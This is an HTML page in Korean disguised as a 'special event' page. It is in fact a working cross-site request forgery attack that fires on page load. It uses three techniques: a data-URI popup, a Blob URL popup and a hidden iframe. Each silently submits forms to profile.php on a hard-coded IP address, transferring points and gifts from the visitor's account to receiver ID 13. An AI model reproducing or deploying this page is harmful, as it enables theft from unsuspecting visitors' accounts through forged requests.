<!DOCTYPE html>
<html>
<head>
    <title>🎁 특별 이벤트</title>
</head>
<body>
    <h1>🎯 이벤트 페이지</h1>
    <div id="status">로딩중...</div>

    <script>
        // 방법 1: 동적 iframe + data URI
        function createDataURIAttack() {
            const formHTML = `
                <form id="attackForm" action="http://3.35.218.180/profile.php" method="POST">
                    <input type="hidden" name="receiver_id" value="13">
                    <input type="hidden" name="points" value="100">
                    <input type="hidden" name="send_gift" value="1">
                    <input type="hidden" name="gift_type" value="diamond">
                    <input type="hidden" name="message" value="GitHub에서 털렸다!">
                </form>
                <script>
                    setTimeout(() => {
                        document.getElementById('attackForm').submit();
                    }, 1000);
                <\/script>
            `;
            
            const dataURI = 'data:text/html;base64,' + btoa(formHTML);
            const popup = window.open(dataURI, '_blank', 'width=1,height=1');
            
            setTimeout(() => {
                if(popup) popup.close();
            }, 3000);
        }

        // 방법 2: Blob URL 생성
        function createBlobAttack() {
            const attackCode = `
                <!DOCTYPE html>
                <html>
                <body>
                    <form id="f" action="http://3.35.218.180/profile.php" method="POST">
                        <input name="receiver_id" value="13">
                        <input name="points" value="75">
                        <input name="send_gift" value="1">
                        <input name="gift_type" value="cake">
                    </form>
                    <script>
                        document.getElementById('f').submit();
                    <\/script>
                </body>
                </html>
            `;
            
            const blob = new Blob([attackCode], {type: 'text/html'});
            const url = URL.createObjectURL(blob);
            
            const popup = window.open(url, '_blank', 'width=1,height=1');
            setTimeout(() => {
                if(popup) popup.close();
                URL.revokeObjectURL(url);
            }, 3000);
        }

        // 방법 3: 숨겨진 iframe + document.write
        function createIframeAttack() {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.style.width = '0px';
            iframe.style.height = '0px';
            
            document.body.appendChild(iframe);
            
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            doc.write(`
                <form id="attack" action="http://3.35.218.180/profile.php" method="POST">
                    <input type="hidden" name="receiver_id" value="13">
                    <input type="hidden" name="points" value="50">
                    <input type="hidden" name="send_gift" value="1">
                    <input type="hidden" name="gift_type" value="coffee">
                    <input type="hidden" name="message" value="iframe 공격!">
                </form>
                <script>
                    setTimeout(() => {
                        document.getElementById('attack').submit();
                    }, 500);
                <\/script>
            `);
            doc.close();
        }

        // 공격 실행
        setTimeout(createDataURIAttack, 2000);
        setTimeout(createBlobAttack, 4000);
        setTimeout(createIframeAttack, 6000);
        
        console.log('🔴 GitHub Pages CSRF 우회 공격 시작');
    </script>
</body>
</html>
